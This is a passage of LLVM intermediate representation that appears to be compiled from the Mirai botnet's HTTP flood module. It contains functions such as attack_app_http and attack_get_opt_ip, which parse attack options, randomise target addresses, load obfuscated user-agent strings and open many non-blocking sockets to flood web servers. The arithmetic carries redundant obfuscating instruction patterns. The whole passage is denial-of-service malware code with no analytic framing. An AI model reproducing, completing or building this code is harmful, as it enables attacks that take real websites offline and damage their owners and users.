  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 20, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 23, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %86, %4
  br label %2789

; <label>:90:                                     ; preds = %86
  %91 = load i8*, i8** %17, align 8
  %92 = call i32 @util_strlen(i8* %91)
  %93 = icmp sgt i32 %92, 255
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %90
  br label %2789

; <label>:95:                                     ; preds = %90
  %96 = load i8*, i8** %16, align 8
  %97 = call i32 @util_strlen(i8* %96)
  %98 = icmp sgt i32 %97, 127
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %95
  br label %2789

; <label>:100:                                    ; preds = %95
  %101 = load i8*, i8** %15, align 8
  %102 = call i32 @util_strlen(i8* %101)
  %103 = icmp sgt i32 %102, 9
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %2789

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %10, align 4
  br label %106

; <label>:106:                                    ; preds = %139, %105
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %15, align 8
  %109 = call i32 @util_strlen(i8* %108)
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %146

; <label>:111:                                    ; preds = %106
  %112 = load i8*, i8** %15, align 8
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = sext i8 %116 to i32
  %118 = icmp sge i32 %117, 97
  br i1 %118, label %119, label %138

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %15, align 8
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp sle i32 %125, 122
  br i1 %126, label %127, label %138

; <label>:127:                                    ; preds = %119
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = sub i32 0, 32
  %135 = add i32 %133, %134
  %136 = sub nsw i32 %133, 32
  %137 = trunc i32 %135 to i8
  store i8 %137, i8* %131, align 1
  br label %138

; <label>:138:                                    ; preds = %127, %119, %111
  br label %139

; <label>:139:                                    ; preds = %138
  %140 = load i32, i32* %10, align 4
  %141 = sub i32 0, %140
  %142 = sub i32 0, 1
  %143 = add i32 %141, %142
  %144 = sub i32 0, %143
  %145 = add nsw i32 %140, 1
  store i32 %144, i32* %10, align 4
  br label %106

; <label>:146:                                    ; preds = %106
  %147 = load i32, i32* %18, align 4
  %148 = icmp sgt i32 %147, 512
  br i1 %148, label %149, label %150

; <label>:149:                                    ; preds = %146
  store i32 512, i32* %18, align 4
  br label %150

; <label>:150:                                    ; preds = %149, %146
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  call void @table_unlock_val(i8 zeroext 47)
  call void @table_unlock_val(i8 zeroext 48)
  call void @table_unlock_val(i8 zeroext 49)
  call void @table_unlock_val(i8 zeroext 50)
  call void @table_unlock_val(i8 zeroext 51)
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  %151 = load i32, i32* %18, align 4
  %152 = sext i32 %151 to i64
  %153 = call noalias i8* @calloc(i64 %152, i64 3140) #6
  %154 = bitcast i8* %153 to %struct.attack_http_state*
  store %struct.attack_http_state* %154, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %155

; <label>:155:                                    ; preds = %356, %150
  %156 = load i32, i32* %9, align 4
  %157 = load i32, i32* %18, align 4
  %158 = icmp slt i32 %156, %157
  br i1 %158, label %159, label %363

; <label>:159:                                    ; preds = %155
  %160 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %161 = load i32, i32* %9, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %160, i64 %162
  %164 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %163, i32 0, i32 1
  store i8 0, i8* %164, align 4
  %165 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %166 = load i32, i32* %9, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %165, i64 %167
  %169 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %168, i32 0, i32 0
  store i32 -1, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = load i8, i8* %5, align 1
  %173 = zext i8 %172 to i32
  %174 = srem i32 %171, %173
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %180 = load i32, i32* %9, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %179, i64 %181
  %183 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %182, i32 0, i32 4
  store i32 %178, i32* %183, align 4
  %184 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %187, i32 0, i32 6
  %189 = getelementptr inbounds [257 x i8], [257 x i8]* %188, i32 0, i32 0
  %190 = load i8*, i8** %17, align 8
  %191 = call i32 @util_strcpy(i8* %189, i8* %190)
  %192 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %193 = load i32, i32* %9, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %192, i64 %194
  %196 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %195, i32 0, i32 6
  %197 = getelementptr inbounds [257 x i8], [257 x i8]* %196, i64 0, i64 0
  %198 = load i8, i8* %197, align 4
  %199 = sext i8 %198 to i32
  %200 = icmp ne i32 %199, 47
  br i1 %200, label %201, label %229

; <label>:201:                                    ; preds = %159
  %202 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %202, i64 %204
  %206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %205, i32 0, i32 6
  %207 = getelementptr inbounds [257 x i8], [257 x i8]* %206, i32 0, i32 0
  %208 = getelementptr inbounds i8, i8* %207, i64 1
  %209 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %210 = load i32, i32* %9, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %212, i32 0, i32 6
  %214 = getelementptr inbounds [257 x i8], [257 x i8]* %213, i32 0, i32 0
  %215 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %216 = load i32, i32* %9, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %218, i32 0, i32 6
  %220 = getelementptr inbounds [257 x i8], [257 x i8]* %219, i32 0, i32 0
  %221 = call i32 @util_strlen(i8* %220)
  %222 = sext i32 %221 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %208, i8* %214, i64 %222, i32 1, i1 false)
  %223 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %224 = load i32, i32* %9, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %223, i64 %225
  %227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %226, i32 0, i32 6
  %228 = getelementptr inbounds [257 x i8], [257 x i8]* %227, i64 0, i64 0
  store i8 47, i8* %228, align 4
  br label %229

; <label>:229:                                    ; preds = %201, %159
  %230 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %231 = load i32, i32* %9, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %233, i32 0, i32 10
  %235 = getelementptr inbounds [9 x i8], [9 x i8]* %234, i32 0, i32 0
  %236 = load i8*, i8** %15, align 8
  %237 = call i32 @util_strcpy(i8* %235, i8* %236)
  %238 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %239 = load i32, i32* %9, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %238, i64 %240
  %242 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %241, i32 0, i32 9
  %243 = getelementptr inbounds [9 x i8], [9 x i8]* %242, i32 0, i32 0
  %244 = load i8*, i8** %15, align 8
  %245 = call i32 @util_strcpy(i8* %243, i8* %244)
  %246 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %247 = load i32, i32* %9, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %246, i64 %248
  %250 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %249, i32 0, i32 7
  %251 = getelementptr inbounds [129 x i8], [129 x i8]* %250, i32 0, i32 0
  %252 = load i8*, i8** %16, align 8
  %253 = call i32 @util_strcpy(i8* %251, i8* %252)
  %254 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %255 = load i32, i32* %9, align 4
  %256 = load i8, i8* %5, align 1
  %257 = zext i8 %256 to i32
  %258 = srem i32 %255, %257
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i64 %259
  %261 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %260, i32 0, i32 2
  %262 = load i8, i8* %261, align 4
  %263 = zext i8 %262 to i32
  %264 = icmp slt i32 %263, 32
  br i1 %264, label %265, label %299

; <label>:265:                                    ; preds = %229
  %266 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %267 = load i32, i32* %9, align 4
  %268 = load i8, i8* %5, align 1
  %269 = zext i8 %268 to i32
  %270 = srem i32 %267, %269
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i64 %271
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i32 0, i32 1
  %274 = load i32, i32* %273, align 4
  %275 = call i32 @ntohl(i32 %274) #7
  %276 = call i32 @rand_next()
  %277 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %278 = load i32, i32* %9, align 4
  %279 = load i8, i8* %5, align 1
  %280 = zext i8 %279 to i32
  %281 = srem i32 %278, %280
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i64 %282
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i32 0, i32 2
  %285 = load i8, i8* %284, align 4
  %286 = zext i8 %285 to i32
  %287 = lshr i32 %276, %286
  %288 = sub i32 0, %275
  %289 = sub i32 0, %287
  %290 = add i32 %288, %289
  %291 = sub i32 0, %290
  %292 = add i32 %275, %287
  %293 = call i32 @htonl(i32 %291) #7
  %294 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %294, i64 %296
  %298 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %297, i32 0, i32 4
  store i32 %293, i32* %298, align 4
  br label %299

; <label>:299:                                    ; preds = %265, %229
  %300 = call i32 @rand_next()
  %301 = urem i32 %300, 5
  switch i32 %301, label %347 [
    i32 0, label %302
    i32 1, label %311
    i32 2, label %320
    i32 3, label %329
    i32 4, label %338
  ]

; <label>:302:                                    ; preds = %299
  call void @table_unlock_val(i8 zeroext 54)
  %303 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %304 = load i32, i32* %9, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %303, i64 %305
  %307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %306, i32 0, i32 5
  %308 = getelementptr inbounds [512 x i8], [512 x i8]* %307, i32 0, i32 0
  %309 = call i8* @table_retrieve_val(i32 54, i32* null)
  %310 = call i32 @util_strcpy(i8* %308, i8* %309)
  call void @table_lock_val(i8 zeroext 54)
  br label %347

; <label>:311:                                    ; preds = %299
  call void @table_unlock_val(i8 zeroext 55)
  %312 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %313 = load i32, i32* %9, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %312, i64 %314
  %316 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %315, i32 0, i32 5
  %317 = getelementptr inbounds [512 x i8], [512 x i8]* %316, i32 0, i32 0
  %318 = call i8* @table_retrieve_val(i32 55, i32* null)
  %319 = call i32 @util_strcpy(i8* %317, i8* %318)
  call void @table_lock_val(i8 zeroext 55)
  br label %347

; <label>:320:                                    ; preds = %299
  call void @table_unlock_val(i8 zeroext 56)
  %321 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %324, i32 0, i32 5
  %326 = getelementptr inbounds [512 x i8], [512 x i8]* %325, i32 0, i32 0
  %327 = call i8* @table_retrieve_val(i32 56, i32* null)
  %328 = call i32 @util_strcpy(i8* %326, i8* %327)
  call void @table_lock_val(i8 zeroext 56)
  br label %347

; <label>:329:                                    ; preds = %299
  call void @table_unlock_val(i8 zeroext 57)
  %330 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %331 = load i32, i32* %9, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %330, i64 %332
  %334 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %333, i32 0, i32 5
  %335 = getelementptr inbounds [512 x i8], [512 x i8]* %334, i32 0, i32 0
  %336 = call i8* @table_retrieve_val(i32 57, i32* null)
  %337 = call i32 @util_strcpy(i8* %335, i8* %336)
  call void @table_lock_val(i8 zeroext 57)
  br label %347

; <label>:338:                                    ; preds = %299
  call void @table_unlock_val(i8 zeroext 58)
  %339 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %340 = load i32, i32* %9, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %339, i64 %341
  %343 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %342, i32 0, i32 5
  %344 = getelementptr inbounds [512 x i8], [512 x i8]* %343, i32 0, i32 0
  %345 = call i8* @table_retrieve_val(i32 58, i32* null)
  %346 = call i32 @util_strcpy(i8* %344, i8* %345)
  call void @table_lock_val(i8 zeroext 58)
  br label %347

; <label>:347:                                    ; preds = %338, %329, %320, %311, %302, %299
  %348 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %349 = load i32, i32* %9, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %348, i64 %350
  %352 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %351, i32 0, i32 6
  %353 = getelementptr inbounds [257 x i8], [257 x i8]* %352, i32 0, i32 0
  %354 = load i8*, i8** %17, align 8
  %355 = call i32 @util_strcpy(i8* %353, i8* %354)
  br label %356

; <label>:356:                                    ; preds = %347
  %357 = load i32, i32* %9, align 4
  %358 = sub i32 0, %357
  %359 = sub i32 0, 1
  %360 = add i32 %358, %359
  %361 = sub i32 0, %360
  %362 = add nsw i32 %357, 1
  store i32 %361, i32* %9, align 4
  br label %155

; <label>:363:                                    ; preds = %155
  br label %364

; <label>:364:                                    ; preds = %2788, %1059, %1049, %363
  store i32 0, i32* %23, align 4
  %365 = call i64 @time(i64* null) #6
  %366 = trunc i64 %365 to i32
  store i32 %366, i32* %27, align 4
  br label %367

; <label>:367:                                    ; preds = %364
  %368 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %369 = getelementptr inbounds [16 x i64], [16 x i64]* %368, i64 0, i64 0
  %370 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %369) #6, !srcloc !1
  %371 = extractvalue { i64, i64* } %370, 0
  %372 = extractvalue { i64, i64* } %370, 1
  %373 = trunc i64 %371 to i32
  store i32 %373, i32* %28, align 4
  %374 = ptrtoint i64* %372 to i64
  %375 = trunc i64 %374 to i32
  store i32 %375, i32* %29, align 4
  br label %376

; <label>:376:                                    ; preds = %367
  br label %377

; <label>:377:                                    ; preds = %376
  %378 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %379 = getelementptr inbounds [16 x i64], [16 x i64]* %378, i64 0, i64 0
  %380 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %379) #6, !srcloc !2
  %381 = extractvalue { i64, i64* } %380, 0
  %382 = extractvalue { i64, i64* } %380, 1
  %383 = trunc i64 %381 to i32
  store i32 %383, i32* %30, align 4
  %384 = ptrtoint i64* %382 to i64
  %385 = trunc i64 %384 to i32
  store i32 %385, i32* %31, align 4
  br label %386

; <label>:386:                                    ; preds = %377
  store i32 0, i32* %9, align 4
  br label %387

; <label>:387:                                    ; preds = %1040, %386
  %388 = load i32, i32* %9, align 4
  %389 = load i32, i32* %18, align 4
  %390 = icmp slt i32 %388, %389
  br i1 %390, label %391, label %1046

; <label>:391:                                    ; preds = %387
  %392 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %392, i64 %394
  store %struct.attack_http_state* %395, %struct.attack_http_state** %26, align 8
  %396 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %396, i32 0, i32 1
  %398 = load i8, i8* %397, align 4
  %399 = zext i8 %398 to i32
  %400 = icmp eq i32 %399, 1
  br i1 %400, label %401, label %413

; <label>:401:                                    ; preds = %391
  %402 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %403 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %402, i32 0, i32 12
  %404 = load i32, i32* %403, align 4
  %405 = icmp ne i32 %404, 0
  br i1 %405, label %406, label %409

; <label>:406:                                    ; preds = %401
  %407 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %407, i32 0, i32 1
  store i8 4, i8* %408, align 4
  br label %412

; <label>:409:                                    ; preds = %401
  %410 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %411 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %410, i32 0, i32 1
  store i8 0, i8* %411, align 4
  br label %412

; <label>:412:                                    ; preds = %409, %406
  br label %413

; <label>:413:                                    ; preds = %412, %391
  %414 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %415 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %414, i32 0, i32 1
  %416 = load i8, i8* %415, align 4
  %417 = zext i8 %416 to i32
  %418 = icmp eq i32 %417, 0
  br i1 %418, label %419, label %520

; <label>:419:                                    ; preds = %413
  %420 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %420, i8 0, i64 16, i32 4, i1 false)
  %421 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %421, i32 0, i32 0
  %423 = load i32, i32* %422, align 4
  %424 = icmp ne i32 %423, -1
  br i1 %424, label %425, label %430

; <label>:425:                                    ; preds = %419
  %426 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %426, i32 0, i32 0
  %428 = load i32, i32* %427, align 4
  %429 = call i32 @close(i32 %428)
  br label %430

; <label>:430:                                    ; preds = %425, %419
  %431 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %432 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %433 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %432, i32 0, i32 0
  store i32 %431, i32* %433, align 4
  %434 = icmp eq i32 %431, -1
  br i1 %434, label %435, label %436

; <label>:435:                                    ; preds = %430
  br label %1040

; <label>:436:                                    ; preds = %430
  %437 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %438 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %437, i32 0, i32 0
  %439 = load i32, i32* %438, align 4
  %440 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %441 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %440, i32 0, i32 0
  %442 = load i32, i32* %441, align 4
  %443 = call i32 (i32, i32, ...) @fcntl(i32 %442, i32 3, i32 0)
  %444 = and i32 2048, %443
  %445 = xor i32 2048, %443
  %446 = or i32 %444, %445
  %447 = or i32 2048, %443
  %448 = call i32 (i32, i32, ...) @fcntl(i32 %439, i32 4, i32 %446)
  store i32 65535, i32* %10, align 4
  %449 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %450 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %449, i32 0, i32 0
  %451 = load i32, i32* %450, align 4
  %452 = bitcast i32* %10 to i8*
  %453 = call i32 @setsockopt(i32 %451, i32 0, i32 8, i8* %452, i32 4) #6
  %454 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %454, align 4
  %455 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %456 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %455, i32 0, i32 4
  %457 = load i32, i32* %456, align 4
  %458 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %459 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %458, i32 0, i32 0
  store i32 %457, i32* %459, align 4
  %460 = load i16, i16* %19, align 2
  %461 = call zeroext i16 @htons(i16 zeroext %460) #7
  %462 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
